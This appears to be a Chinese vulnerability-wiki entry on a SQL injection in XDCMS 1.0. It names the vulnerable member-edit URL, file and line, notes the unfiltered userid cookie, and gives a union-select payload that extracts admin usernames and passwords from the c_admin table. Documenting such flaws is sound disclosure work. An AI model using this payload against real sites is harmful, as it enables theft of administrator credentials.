XDCMS 1.0 sql注入漏洞（二）
===========================

一、漏洞简介
------------

二、漏洞影响
------------

XDCMS 1.0

三、复现过程
------------

漏洞存在于用户资料修改页面，URL：`index.php?m=member&f=edit`

![](/Users/aresx/Documents/VulWiki/.resource/XDCMS1.0sql注入漏洞(二)/media/rId24.jpg)

漏洞文件位于`system/modules/member/index.php`，`line:178`

![](/Users/aresx/Documents/VulWiki/.resource/XDCMS1.0sql注入漏洞(二)/media/rId25.jpg)

\$userid直接从Cookie中取出，并无任何过滤，导致注入

![](/Users/aresx/Documents/VulWiki/.resource/XDCMS1.0sql注入漏洞(二)/media/rId26.jpg)

    select * from table_member where 'userid'=-4 Union seLect 1,2,username,4,5,6,7,8,9,10,11,12,password,14,15 fRom c_admin
